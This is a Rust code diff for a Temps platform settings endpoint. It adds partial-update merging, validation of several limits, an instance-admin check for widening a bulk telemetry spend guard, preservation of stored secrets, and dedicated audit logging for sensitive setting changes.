+/// An explicit `null` counts as **sent**: a client writing
+/// `"telemetry_bulk_rate_limit_spans_per_sec": null` is asking to clear the
+/// throttle, and honouring that is precisely why presence is tracked rather than
+/// inferred from the value.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+struct CloudFieldsSent {
+    backend_url: bool,
+    telemetry_outbox_max_bytes: bool,
+    telemetry_bulk_rate_limit_spans_per_sec: bool,
+    telemetry_bulk_anomaly_factor: bool,
+}
+
+impl CloudFieldsSent {
+    /// Read key presence from a raw settings document. A `cloud` member that is
+    /// missing, or present but not an object, means the client sent none of
+    /// these fields — a non-object is rejected moments later by deserialization
+    /// anyway, so "sent nothing" is both true and the safe answer.
+    fn from_settings_body(body: &serde_json::Value) -> Self {
+        let Some(cloud) = body.get("cloud").and_then(serde_json::Value::as_object) else {
+            return Self::default();
+        };
+        Self {
+            backend_url: cloud.contains_key("backend_url"),
+            telemetry_outbox_max_bytes: cloud.contains_key("telemetry_outbox_max_bytes"),
+            telemetry_bulk_rate_limit_spans_per_sec: cloud
+                .contains_key("telemetry_bulk_rate_limit_spans_per_sec"),
+            telemetry_bulk_anomaly_factor: cloud.contains_key("telemetry_bulk_anomaly_factor"),
+        }
+    }
+}
+
+/// The presence-sensitive part of a `PUT /settings` body, as a typed view.
+///
+/// `PUT /settings` replaces the whole document and `#[serde(default)]` turns an
+/// absent `multi_node.node_failover_after_secs` into `Some(300)`, so
+/// `AppSettings` alone cannot tell "the client did not mention it" from "the
+/// client wants the default". Without that distinction an older client saving
+/// unrelated settings would silently reset a custom grace period — and turn an
+/// explicit `null` (automatic failover disabled) back on.
+///
+/// The outer `Option` is presence, the inner one is the value: absent key ->
+/// `None`, explicit `null` -> `Some(None)`, a number -> `Some(Some(n))`. A plain
+/// `Option<Option<T>>` cannot express that — serde collapses `null` into the
+/// outer `None` — hence [`deserialize_present`].
+#[derive(Debug, Default, Deserialize)]
+struct SettingsWritePresence {
+    #[serde(default)]
+    multi_node: Option<MultiNodeWritePresence>,
+}
+
+#[derive(Debug, Default, Deserialize)]
+struct MultiNodeWritePresence {
+    #[serde(default, deserialize_with = "deserialize_present")]
+    node_failover_after_secs: Option<Option<u64>>,
+}
+
+/// Deserialize a field that was present on the wire, keeping `null` as
+/// `Some(None)`. Only runs when the key exists; `#[serde(default)]` supplies
+/// the outer `None` when it does not.
+fn deserialize_present<'de, D, T>(deserializer: D) -> Result<Option<Option<T>>, D::Error>
+where
+    D: serde::Deserializer<'de>,
+    T: Deserialize<'de>,
+{
+    Option::<T>::deserialize(deserializer).map(Some)
+}
+
+impl SettingsWritePresence {
+    /// Read presence from a settings body. A body this view cannot read (a
+    /// non-object `multi_node`, a non-numeric grace period) reports nothing as
+    /// sent: the full `AppSettings` deserialization rejects that same body
+    /// moments later, so "sent nothing" is both true and the safe answer.
+    fn from_settings_body(body: &serde_json::Value) -> Self {
+        Self::deserialize(body).unwrap_or_default()
+    }
+
+    /// Whether the client sent `multi_node.node_failover_after_secs` at all.
+    /// An explicit `null` counts as sent.
+    fn node_failover_after_secs_sent(&self) -> bool {
+        self.multi_node
+            .as_ref()
+            .is_some_and(|multi_node| multi_node.node_failover_after_secs.is_some())
+    }
+}
+
+/// Keep the parts of the `cloud` block a generic settings write must not change:
+/// the export consent flags always, and every operator-tuned field the client
+/// did not send.
+///
+/// Two rules, both consequences of `PUT /settings` replacing the whole document:
+///
+/// - **Consent is never writable through this endpoint.** Enabling a Cloud
+///   export requires resource-specific permissions and goes through
+///   `PATCH /cloud/features`; a generic settings write must not bypass those
+///   guards even when it submits a complete `AppSettings`. Restored from the DB
+///   unconditionally, whether the client sent it or not.
+/// - **A field the client did not send keeps its stored value.** Applies to
+///   `backend_url` and `telemetry_outbox_max_bytes` (ADR-041) and to both
+///   bulk-activation guards (ADR-042 §3, §6.3). See [`CloudFieldsSent`] for why
+///   "did not send" is read from the request body rather than inferred from the
+///   deserialized value.
+fn preserve_cloud_settings_not_sent_by_every_client(
+    incoming: &mut AppSettings,
+    current: &AppSettings,
+    sent: CloudFieldsSent,
+) {
+    incoming.cloud.telemetry_enabled = current.cloud.telemetry_enabled;
+    incoming.cloud.backups_enabled = current.cloud.backups_enabled;
+    incoming.cloud.notifications_enabled = current.cloud.notifications_enabled;
+
+    if !sent.backend_url {
+        incoming.cloud.backend_url = current.cloud.backend_url.clone();
+    }
+    if !sent.telemetry_outbox_max_bytes {
+        incoming.cloud.telemetry_outbox_max_bytes = current.cloud.telemetry_outbox_max_bytes;
+    }
+    if !sent.telemetry_bulk_rate_limit_spans_per_sec {
+        incoming.cloud.telemetry_bulk_rate_limit_spans_per_sec =
+            current.cloud.telemetry_bulk_rate_limit_spans_per_sec;
+    }
+    if !sent.telemetry_bulk_anomaly_factor {
+        incoming.cloud.telemetry_bulk_anomaly_factor = current.cloud.telemetry_bulk_anomaly_factor;
+    }
 }
 
 /// Trim and validate an optional URL setting (`external_url`/`internal_url`).
@@ -1508,6 +2139,40 @@ fn sanitize_optional_url(
     Ok(Some(trimmed))
 }
 
+/// Trim and validate `registry_mirror_prefix`, rejecting anything outside a
+/// registry host+path's character set (alphanumerics, `.`, `-`, `_`, `:`,
+/// `/`).
+///
+/// This is the write-time half of the injection defense: `qualify_with_registry_prefix`
+/// (`temps-core::registry_prefix`) already refuses to splice a malformed
+/// prefix into a Dockerfile at build time, but rejecting here means an
+/// operator gets an immediate 400 explaining why, instead of the prefix
+/// silently never applying to any build. Reuses `temps_core`'s allowlist
+/// rather than re-deriving it, so the write-time check and the build-time
+/// check can never drift apart.
+fn sanitize_registry_mirror_prefix(prefix: Option<String>) -> Result<Option<String>, Problem> {
+    let Some(raw) = prefix else {
+        return Ok(None);
+    };
+
+    let trimmed = raw.trim().trim_end_matches('/').to_string();
+    if trimmed.is_empty() {
+        return Ok(None);
+    }
+
+    if !temps_core::registry_prefix::is_valid_registry_prefix(&trimmed) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Invalid Registry Mirror Prefix")
+            .detail(
+                "registry_mirror_prefix may only contain letters, digits, '.', '-', '_', ':' and '/'"
+                    .to_string(),
+            )
+            .build());
+    }
+
+    Ok(Some(trimmed))
+}
+
 fn validate_observability_compression(
     compression: &ObservabilityCompressionSettings,
 ) -> Result<(), Problem> {
@@ -1542,6 +2207,87 @@ fn validate_ai_chat_limits(limits: &AiChatLimitsSettings) -> Result<(), Problem>
                  (got {})",
                 limits.turn_timeout_secs
             ))
+            .build());
+    }
+    Ok(())
+}
+
+fn validate_ai_workspace_file_limits(
+    limits: &AiWorkspaceFileLimitsSettings,
+) -> Result<(), Problem> {
+    let invalid = [
+        (
+            "max_files_per_upload",
+            u64::from(limits.max_files_per_upload),
+            1,
+            100,
+        ),
+        (
+            "max_file_size_mb",
+            u64::from(limits.max_file_size_mb),
+            1,
+            32,
+        ),
+        (
+            "max_upload_size_mb",
+            u64::from(limits.max_upload_size_mb),
+            1,
+            32,
+        ),
+        (
+            "max_workspace_size_mb",
+            u64::from(limits.max_workspace_size_mb),
+            1,
+            2_048,
+        ),
+        (
+            "max_workspace_entries",
+            u64::from(limits.max_workspace_entries),
+            1,
+            50_000,
+        ),
+        (
+            "max_text_preview_kb",
+            u64::from(limits.max_text_preview_kb),
+            1,
+            1_024,
+        ),
+        (
+            "max_image_preview_size_mb",
+            u64::from(limits.max_image_preview_size_mb),
+            1,
+            16,
+        ),
+        (
+            "max_download_size_mb",
+            u64::from(limits.max_download_size_mb),
+            1,
+            32,
+        ),
+    ]
+    .into_iter()
+    .find(|(_, value, min, max)| !(*min..=*max).contains(value));
+
+    if let Some((name, value, min, max)) = invalid {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(format!(
+                "ai_workspace_file_limits.{name} must be between {min} and {max} (got {value})"
+            ))
+            .build());
+    }
+    if limits.max_file_size_mb > limits.max_upload_size_mb {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail("ai_workspace_file_limits.max_file_size_mb cannot exceed max_upload_size_mb")
+            .build());
+    }
+    if limits.max_image_preview_size_mb > limits.max_download_size_mb {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(
+                "ai_workspace_file_limits.max_image_preview_size_mb cannot exceed max_download_size_mb",
+            )
             .build());
     }
     Ok(())
@@ -1641,6 +2387,98 @@ fn validate_monitoring_settings(monitoring: &MonitoringSettings) -> Result<(), P
     Ok(())
 }
 
+/// Reject a bulk-activation anomaly factor outside the supported range.
+///
+/// `effective_bulk_anomaly_factor` clamps on read, so an out-of-range value
+/// could never reach the worker — but silently clamping a write hides the
+/// operator's mistake behind a settings page that echoes back `1000` while the
+/// instance is really running at 50. Worse, it hides it in the one direction
+/// that costs money: an operator who believes they widened the guard to 1000×
+/// and did not is being lied to about their own spend ceiling. Rejecting keeps
+/// the stored value and the effective value the same thing, which is the only
+/// way the page can be trusted.
+fn validate_bulk_activation_guards(cloud: &CloudSettings) -> Result<(), Problem> {
+    let Some(factor) = cloud.telemetry_bulk_anomaly_factor else {
+        // Unset is the documented default, not an out-of-range value.
+        return Ok(());
+    };
+    if !factor.is_finite()
+        || !(MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR..=MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR)
+            .contains(&factor)
+    {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(format!(
+                "cloud.telemetry_bulk_anomaly_factor must be between \
+                 {MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR} and \
+                 {MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR} (got {factor}). This is the multiple \
+                 of its own estimate a project may ship before a bulk Temps Cloud activation \
+                 stops it, so it is a tuning range and not an off switch. A project that needs a \
+                 wider margin than {MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR}x should be activated \
+                 from the Cloud telemetry status card, which estimates it and shows the number \
+                 before anything is sent."
+            ))
+            .value(
+                "minimum",
+                MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR.to_string(),
+            )
+            .value(
+                "maximum",
+                MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR.to_string(),
+            )
+            .build());
+    }
+    Ok(())
+}
+
+/// Confine *widening* the bulk-activation money guard to an instance operator.
+///
+/// Asymmetric on purpose, and the asymmetry is the whole point:
+///
+/// - **Narrowing** it (a smaller factor, a stricter guard) makes an activation
+///   more likely to stop early with its cursor intact. The worst outcome is a
+///   retry click, so ordinary `SettingsWrite` is the right bar — and requiring
+///   more would mean an operator who spots a runaway bill cannot tighten the
+///   guard without finding an administrator first.
+/// - **Widening** it raises the ceiling on what a purchase-triggered activation
+///   may spend with nobody confirming it. That is the same authority the
+///   operator bulk-activation endpoints already reserve to an instance
+///   administrator (`OtelWrite` + instance admin), and it would be incoherent
+///   for `POST /bulk-jobs` to demand it while a `SettingsWrite` holder could
+///   raise the ceiling on the very same spend through the settings document.
+///
+/// Scoped to this one field rather than to the endpoint: tightening the whole
+/// settings PUT to instance-admin would break every unrelated caller that
+/// legitimately holds `SettingsWrite`.
+fn authorize_bulk_activation_guard_change(
+    auth: &temps_auth::AuthContext,
+    previous: BulkActivationGuards,
+    next: BulkActivationGuards,
+) -> Result<(), Problem> {
+    if next.anomaly_factor <= previous.anomaly_factor || auth.is_instance_admin() {
+        return Ok(());
+    }
+    Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+        .type_("https://temps.sh/probs/insufficient-permissions")
+        .title("Instance Administrator Required")
+        .detail(format!(
+            "Raising cloud.telemetry_bulk_anomaly_factor from {} to {} widens the byte budget a \
+             bulk Temps Cloud telemetry activation may spend on a project before it stops, on a \
+             path that spends without a human confirming it. Loosening that guard is restricted \
+             to an instance administrator, the same bar the bulk activation endpoints \
+             themselves use. Lowering it, or leaving it alone, needs only settings:write.",
+            previous.anomaly_factor, next.anomaly_factor
+        ))
+        .value("required_role", temps_auth::Role::PlatformAdmin.to_string())
+        .value("user_role", auth.effective_role.to_string())
+        .value(
+            "current_anomaly_factor",
+            previous.anomaly_factor.to_string(),
+        )
+        .value("requested_anomaly_factor", next.anomaly_factor.to_string())
+        .build())
+}
+
 fn validate_observability_retention(
     retention: &ObservabilityRetentionSettings,
 ) -> Result<(), Problem> {
@@ -1649,6 +2487,7 @@ fn validate_observability_retention(
         ("otel_spans_days", retention.otel_spans_days),
         ("otel_logs_days", retention.otel_logs_days),
         ("otel_metrics_days", retention.otel_metrics_days),
+        ("container_logs_days", retention.container_logs_days),
     ];
     for (field, days) in values {
         if !(1..=3650).contains(&days) {
@@ -1662,6 +2501,70 @@ fn validate_observability_retention(
     Ok(())
 }
 
+/// Reject out-of-range geolocation knobs instead of silently clamping them, so
+/// an admin who types `0` is told the value was not applied rather than
+/// discovering later that the job runs hourly.
+///
+/// `None` is valid and means "use the default", which is how the field is
+/// cleared.
+/// Collected-log budgets (ADR-046): the read cache and the per-container
+/// head buffer are applied at runtime, so an absurd value must be rejected
+/// here rather than silently clamped later.
+fn validate_container_log_budgets(logs: &temps_core::ContainerLogSettings) -> Result<(), Problem> {
+    if !(64..=1_048_576).contains(&logs.cache_mb) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("container_logs.cache_mb must be between 64 and 1048576 (1 TiB)")
+            .build());
+    }
+    if !(1..=256).contains(&logs.head_buffer_mb) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("container_logs.head_buffer_mb must be between 1 and 256")
+            .build());
+    }
+    Ok(())
+}
+
+fn validate_geo_settings(geo: &temps_core::GeoSettings) -> Result<(), Problem> {
+    if let Some(hours) = geo.refresh_interval_hours {
+        if !(temps_core::MIN_GEO_REFRESH_INTERVAL_HOURS
+            ..=temps_core::MAX_GEO_REFRESH_INTERVAL_HOURS)
+            .contains(&hours)
+        {
+            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                .title("Invalid Geolocation Refresh Interval")
+                .detail(format!(
+                    "geo.refresh_interval_hours must be between {} and {} (got {}); leave it \
+                     empty to use the default of {} hours",
+                    temps_core::MIN_GEO_REFRESH_INTERVAL_HOURS,
+                    temps_core::MAX_GEO_REFRESH_INTERVAL_HOURS,
+                    hours,
+                    temps_core::DEFAULT_GEO_REFRESH_INTERVAL_HOURS,
+                ))
+                .build());
+        }
+    }
+
+    if let Some(days) = geo.stale_lookup_days {
+        if !(temps_core::MIN_GEO_STALE_LOOKUP_DAYS..=temps_core::MAX_GEO_STALE_LOOKUP_DAYS)
+            .contains(&days)
+        {
+            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                .title("Invalid Geolocation Staleness Window")
+                .detail(format!(
+                    "geo.stale_lookup_days must be between {} and {} (got {}); leave it empty to \
+                     use the default of {} days",
+                    temps_core::MIN_GEO_STALE_LOOKUP_DAYS,
+                    temps_core::MAX_GEO_STALE_LOOKUP_DAYS,
+                    days,
+                    temps_core::DEFAULT_GEO_STALE_LOOKUP_DAYS,
+                ))
+                .build());
+        }
+    }
+
+    Ok(())
+}
+
 /// Normalize the edge target: trim whitespace and treat an empty string as
 /// `None` so an operator clearing the field disables DNS record sync.
 fn normalize_edge_target(settings: &mut AppSettings) {
@@ -1669,6 +2572,23 @@ fn normalize_edge_target(settings: &mut AppSettings) {
         let trimmed = value.trim().to_string();
         if !trimmed.is_empty() {
             settings.edge_target = Some(trimmed);
+        }
+    }
+}
+
+/// Fill only absent object fields; arrays, scalars and explicit nulls are
+/// replacement values supplied by the caller, never silently merged.
+fn fill_omitted_settings(submitted: &mut serde_json::Value, stored: serde_json::Value) {
+    if let (Some(submitted), serde_json::Value::Object(stored)) =
+        (submitted.as_object_mut(), stored)
+    {
+        for (key, value) in stored {
+            match submitted.get_mut(&key) {
+                Some(submitted_value) => fill_omitted_settings(submitted_value, value),
+                None => {
+                    submitted.insert(key, value);
+                }
+            }
         }
     }
 }
@@ -1693,9 +2613,111 @@ async fn update_settings(
     RequireAuth(auth): RequireAuth,
     State(app_state): State<Arc<SettingsState>>,
     Extension(metadata): Extension<RequestMetadata>,
-    Json(mut settings): Json<AppSettings>,
+    Json(mut body): Json<serde_json::Value>,
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsWrite);
+
+    // Taken as raw JSON first, and only then turned into an `AppSettings`,
+    // because which `cloud.*` keys the client sent is information
+    // `#[serde(default)]` destroys: it cannot be recovered from the
+    // deserialized document. See `CloudFieldsSent`.
+    // Dedicated SystemAdmin plugin endpoint owns this consent. Strip it from
+    // generic SettingsWrite requests, including full-document round trips.
+    discard_plugin_reporting_consent(&mut body);
+    let cloud_fields_sent = CloudFieldsSent::from_settings_body(&body);
+    let node_failover_sent =
+        SettingsWritePresence::from_settings_body(&body).node_failover_after_secs_sent();
+    let mut settings: AppSettings =
+        serde_path_to_error::deserialize(body.clone()).map_err(|e| {
+            let field = e.path().to_string();
+            ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                .title("Invalid Settings Payload")
+                .detail(format!(
+                    "The settings document could not be read at `{}`: {}. Nothing was saved.",
+                    field,
+                    e.into_inner()
+                ))
+                .value("field", field)
+                .build()
+        })?;
+
+    // ADR-042 §6.3: the money guard on bulk Temps Cloud activation. Validated,
+    // authorized and captured here — before any other field is touched — for
+    // three reasons that all need the *previous* value, which a completed save
+    // can no longer produce: an out-of-range factor is refused rather than
+    // silently clamped, widening it needs the same instance-admin bar the bulk
+    // activation endpoints use, and the change is recorded as its own audit
+    // event with both sides.
+    //
+    // Validated against what the client actually sent, before anything is
+    // merged in from the DB: a stored value that predates a range change, or
+    // was hand-edited, must not make every unrelated save fail with a message
+    // about a field the client never mentioned. `effective_*` clamps such a row
+    // on read.
+    //
+    // A read failure aborts the save. Proceeding would mean applying a
+    // possibly-widened spend ceiling with neither the check nor the record that
+    // are supposed to accompany it.
+    validate_bulk_activation_guards(&settings.cloud)?;
+    let stored_settings = match app_state.config_service.get_settings().await {
+        Ok(current) => current,
+        Err(e) => {
+            error!(
+                "Could not read the current Temps Cloud bulk activation guard settings; \
+                 aborting settings save: {}",
+                e
+            );
+            return Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Settings Save Aborted")
+                .detail(format!(
+                    "Could not read the current Temps Cloud settings, so a change to the bulk \
+                     activation guards could be neither authorized nor recorded, and the fields \
+                     this client did not send could not be preserved; the save was aborted \
+                     rather than applied unchecked. Retry the save; if this persists, check \
+                     database connectivity: {}",
+                    e
+                ))
+                .build());
+        }
+    };
+
+    // PUT accepts partial documents: omitted fields retain their stored values,
+    // including nested settings. Explicit nulls still go through typed validation.
+    let stored_body = serde_json::to_value(&stored_settings).map_err(|error| {
+        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+            .title("Settings Save Aborted")
+            .detail(format!(
+                "Could not serialize current settings for a partial update: {error}"
+            ))
+            .build()
+    })?;
+    fill_omitted_settings(&mut body, stored_body);
+    settings = serde_path_to_error::deserialize(body).map_err(|error| {
+        ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Invalid Settings Payload")
+            .detail(format!(
+                "Could not read merged settings at `{}`: {}. Nothing was saved.",
+                error.path(),
+                error.inner()
+            ))
+            .build()
+    })?;
+
+    // Merge the `cloud` block *before* the guard comparison below, not after:
+    // a save that never mentioned `cloud` is not a request to widen the spend
+    // guard back to its default, and must be neither refused as one (403) nor
+    // recorded as one in the audit log.
+    preserve_cloud_settings_not_sent_by_every_client(
+        &mut settings,
+        &stored_settings,
+        cloud_fields_sent,
+    );
+
+    let previous_bulk_guards = BulkActivationGuards::from(&stored_settings.cloud);
+    let next_bulk_guards = BulkActivationGuards::from(&settings.cloud);
+    authorize_bulk_activation_guard_change(&auth, previous_bulk_guards, next_bulk_guards)?;
+
+    let previous_trust_loopback_forwarded_ip = stored_settings.trust_loopback_forwarded_ip();
 
     // If sensitive fields are masked, preserve the existing values
     if let Some(ref key) = settings.dns_provider.cloudflare_api_key {
@@ -1734,11 +2756,20 @@ async fn update_settings(
         }
     }
 
+    // Whether this request asked to store, rotate, or clear the MaxMind
+    // license key. Set inside the preservation block below (where the
+    // write-only plaintext field is still intact) and consumed twice: by the
+    // service, to decide whether the locked row's ciphertext wins, and by the
+    // dedicated audit record after a successful save.
+    // Left uninitialized deliberately: the only path that skips the block
+    // below aborts the save, so there is no default to fall back to.
+    let geo_license_key_intent: temps_core::GeoLicenseKeyIntent;
+
     // Merge sensitive sandbox/gateway/multi-node fields back from DB. The GET
     // endpoint strips encrypted credentials, shared secrets, and token hashes,
     // so any client round-trip would otherwise wipe them on save. We always
-    // preserve them from the DB unless the incoming payload explicitly sets
-    // them (e.g. a fresh credential save via the AI Providers page).
+    // preserve them from the DB. Provider credentials are only changed through
+    // the dedicated credential endpoint, never through this bulk PUT.
     match app_state.config_service.get_settings().await {
         Ok(current_settings) => {
             // `console_version` is self-recorded state, written only by a starting
@@ -1750,31 +2781,47 @@ async fn update_settings(
             // out of `current_settings` below.
             preserve_self_recorded_fields(&mut settings, &current_settings);
             preserve_omitted_security_fields(&mut settings, &current_settings);
+            settings.plugin_installation_reporting_enabled =
+                current_settings.plugin_installation_reporting_enabled;
+            // The `cloud` block was already merged, further up: the ADR-042
+            // guard authorization depends on the merged value, so it cannot
+            // wait until here.
 
-            // Per-provider credentials: keep existing unless caller supplied a new one
-            for (id, current_cfg) in current_settings.agent_sandbox.providers.iter() {
-                match settings.agent_sandbox.providers.get_mut(id) {
-                    Some(incoming) => {
-                        // Caller didn't include credentials -> restore from DB
-                        if incoming
-                            .credentials_encrypted
-                            .as_deref()
-                            .map(|s| s.is_empty() || s == "******")
-                            .unwrap_or(true)
-                        {
-                            incoming.credentials_encrypted =
-                                current_cfg.credentials_encrypted.clone();
-                        }
-                    }
-                    None => {
-                        // Caller dropped the provider entry entirely -> put it back
-                        settings
-                            .agent_sandbox
-                            .providers
-                            .insert(id.clone(), current_cfg.clone());
-                    }
-                }
-            }
+            // The dedicated credential endpoint is the only write path for
+            // encrypted provider secrets and native-verification proof.
+            preserve_provider_credential_proof(&mut settings, &current_settings);
+            // Geo: restore the refresh metadata only the refresh job may
+            // write, then turn a newly submitted MaxMind license key into
+            // ciphertext (blank preserves the stored one, exactly like the
+            // email-provider credential fields). The plaintext field is
+            // `skip_serializing`, so it cannot reach the settings row even if
+            // this is ever bypassed — but it is consumed here regardless.
+            //
+            // The intent is captured *before* the write-only fields are
+            // consumed and passed down to the service, which re-applies it
+            // against the row it locks: `current_settings` here comes from the
+            // 5s-cached snapshot, so the ciphertext preserved below may
+            // already be stale by the time the row is locked.
+            geo_license_key_intent = settings.geo.license_key_intent();
+            settings.geo.preserve_recorded_state(&current_settings.geo);
+            settings
+                .geo
+                .apply_license_key_update(
+                    &current_settings.geo,
+                    app_state.encryption_service.as_ref(),
+                )
+                .map_err(|error| {
+                    // The error reports a cipher/encoding failure and never
+                    // echoes its input, so it is safe to surface verbatim.
+                    tracing::error!(%error, "Failed to encrypt the submitted MaxMind license key");
+                    ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                        .title("License Key Not Saved")
+                        .detail(format!(
+                            "The MaxMind license key could not be encrypted, so the settings \
+                             were not saved: {error}"
+                        ))
+                        .build()
+                })?;
             // Legacy flat credential
             if settings
                 .agent_sandbox
@@ -1791,9 +2838,19 @@ async fn update_settings(
                 settings.preview_gateway.shared_secret =
                     current_settings.preview_gateway.shared_secret;
             }
+            settings.multi_node.cluster_ca_cert_pem =
+                current_settings.multi_node.cluster_ca_cert_pem;
+            settings.multi_node.cluster_ca_key_encrypted =
+                current_settings.multi_node.cluster_ca_key_encrypted;
             // Multi-node join token hash (never comes back from the mask response)
             if settings.multi_node.join_token_hash.is_none() {
                 settings.multi_node.join_token_hash = current_settings.multi_node.join_token_hash;
+            }
+            // Node failover grace period: keep the stored value (including a
+            // stored `null` = disabled) unless the client actually sent the key.
+            if !node_failover_sent {
+                settings.multi_node.node_failover_after_secs =
+                    current_settings.multi_node.node_failover_after_secs;
             }
             // ClickHouse DSN: the GET response masks it to `clickhouse_url_set`
             // (it can embed credentials), so a client round-trip that doesn't
@@ -1849,13 +2906,18 @@ async fn update_settings(
 
     validate_monitoring_settings(&settings.monitoring)?;
     validate_ai_chat_limits(&settings.ai_chat_limits)?;
+    validate_ai_workspace_file_limits(&settings.ai_workspace_file_limits)?;
     validate_request_timeouts(&settings.request_timeouts)?;
 
     validate_observability_compression(&settings.observability_compression)?;
     validate_observability_retention(&settings.observability_retention)?;
+    validate_container_log_budgets(&settings.container_logs)?;
+    validate_geo_settings(&settings.geo)?;
 
     settings.external_url = sanitize_optional_url("External", settings.external_url)?;
     settings.internal_url = sanitize_optional_url("Internal", settings.internal_url)?;
+    settings.registry_mirror_prefix =
+        sanitize_registry_mirror_prefix(settings.registry_mirror_prefix)?;
     // Validate and sanitize external_url
     if let Some(ref mut ext_url) = settings.external_url {
         *ext_url = ext_url.trim().to_string();
@@ -1903,7 +2965,13 @@ async fn update_settings(
 
     normalize_edge_target(&mut settings);
 
-    match app_state.config_service.update_settings(settings).await {
+    let next_trust_loopback_forwarded_ip = settings.trust_loopback_forwarded_ip();
+
+    match app_state
+        .config_service
+        .update_settings_with_geo_intent(settings, geo_license_key_intent)
+        .await
+    {
         Ok(_) => {
             let audit = SettingsUpdatedAudit {
                 context: AuditContext {
@@ -1914,6 +2982,98 @@ async fn update_settings(
             };
             if let Err(e) = app_state.audit_service.create_audit_log(&audit).await {
                 error!("Failed to create audit log: {}", e);
+            }
+
+            // ADR-042 §6.3: a change to either bulk-activation guard gets its
+            // own record with both sides, because `SETTINGS_UPDATED` carries no
+            // field-level values and a widened spend ceiling must not be
+            // indistinguishable from an unrelated save.
+            if next_bulk_guards != previous_bulk_guards {
+                let widened = next_bulk_guards.anomaly_factor > previous_bulk_guards.anomaly_factor;
+                info!(
+                    previous_anomaly_factor = previous_bulk_guards.anomaly_factor,
+                    new_anomaly_factor = next_bulk_guards.anomaly_factor,
+                    previous_rate_limit_spans_per_sec =
+                        previous_bulk_guards.rate_limit_spans_per_sec,
+                    new_rate_limit_spans_per_sec = next_bulk_guards.rate_limit_spans_per_sec,
+                    widened,
+                    "Temps Cloud bulk activation guard settings changed"
+                );
+                let guard_audit = CloudTelemetryBulkGuardUpdatedAudit {
+                    context: AuditContext {
+                        user_id: auth.user_id(),
+                        ip_address: Some(metadata.ip_address.clone()),
+                        user_agent: metadata.user_agent.clone(),
+                    },
+                    previous_anomaly_factor: previous_bulk_guards.anomaly_factor,
+                    new_anomaly_factor: next_bulk_guards.anomaly_factor,
+                    previous_rate_limit_spans_per_sec: previous_bulk_guards
+                        .rate_limit_spans_per_sec,
+                    new_rate_limit_spans_per_sec: next_bulk_guards.rate_limit_spans_per_sec,
+                    widened_anomaly_factor: widened,
+                };
+                if let Err(e) = app_state.audit_service.create_audit_log(&guard_audit).await {
+                    error!(
+                        "Failed to create the Temps Cloud bulk activation guard audit log: {}",
+                        e
+                    );
+                }
+            }
+
+            // A credential write gets its own record, with booleans only.
+            match geo_license_key_intent {
+                temps_core::GeoLicenseKeyIntent::Unchanged => {}
+                intent => {
+                    let key_set = intent == temps_core::GeoLicenseKeyIntent::Set;
+                    info!(
+                        key_set,
+                        key_cleared = !key_set,
+                        "MaxMind license key changed"
+                    );
+                    let geo_key_audit = GeoLicenseKeyUpdatedAudit {
+                        context: AuditContext {
+                            user_id: auth.user_id(),
+                            ip_address: Some(metadata.ip_address.clone()),
+                            user_agent: metadata.user_agent.clone(),
+                        },
+                        key_set,
+                        key_cleared: !key_set,
+                    };
+                    if let Err(e) = app_state
+                        .audit_service
+                        .create_audit_log(&geo_key_audit)
+                        .await
+                    {
+                        error!("Failed to create the MaxMind license key audit log: {}", e);
+                    }
+                }
+            }
+
+            if next_trust_loopback_forwarded_ip != previous_trust_loopback_forwarded_ip {
+                info!(
+                    previous_enabled = previous_trust_loopback_forwarded_ip,
+                    new_enabled = next_trust_loopback_forwarded_ip,
+                    "Loopback forwarded-IP trust setting changed"
+                );
+                let forwarded_ip_trust_audit = ForwardedIpTrustUpdatedAudit {
+                    context: AuditContext {
+                        user_id: auth.user_id(),
+                        ip_address: Some(metadata.ip_address.clone()),
+                        user_agent: metadata.user_agent.clone(),
+                    },
+                    previous_enabled: previous_trust_loopback_forwarded_ip,
+                    new_enabled: next_trust_loopback_forwarded_ip,
+                };
+                if let Err(e) = app_state
+                    .audit_service
+                    .create_audit_log(&forwarded_ip_trust_audit)
+                    .await
+                {
+                    error!(
+                        "Failed to create the loopback forwarded-IP trust audit log: {}",
+                        e
+                    );
+                }
             }
 
             Ok((
@@ -2011,6 +3171,24 @@ async fn generate_join_token(
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsWrite);
 
+    // Keep the deprecated shared-token path safe for upgrades from older
+    // installations. Cluster trust belongs to the control plane and must
+    // exist before any credential capable of enrolling a worker is issued.
+    // Startup normally initializes it; this endpoint is a deterministic
+    // repair path for a process upgraded without a restart.
+    crate::cluster_ca::ensure_cluster_ca(
+        &app_state.config_service,
+        &app_state.encryption_service,
+    )
+    .await
+    .map_err(|error| {
+        error!(%error, "Failed to initialize cluster CA before join-token generation");
+        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+            .title("Cluster CA Initialization Failed")
+            .detail("The join token was not created because the cluster trust root could not be initialized. Check the server logs for details.")
+            .build()
+    })?;
+
     // Generate a random 32-byte token as hex
     let plaintext_token = {
         let mut rng = rand::rng();
